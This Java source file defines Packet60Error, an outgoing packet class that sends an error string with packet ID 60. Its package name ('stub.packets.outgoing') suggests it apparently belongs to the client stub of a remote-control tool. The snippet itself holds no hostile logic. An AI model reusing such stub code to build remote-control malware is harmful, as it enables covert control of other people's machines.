package com.redpois0n.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet60Error extends AbstractOutgoingPacket {

	private String error;
	
	public Packet60Error(String error) {
		this.error = error;
	}
	
	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(error);
	}

	@Override
	public byte getPacketId() {
		return 60;
	}

}
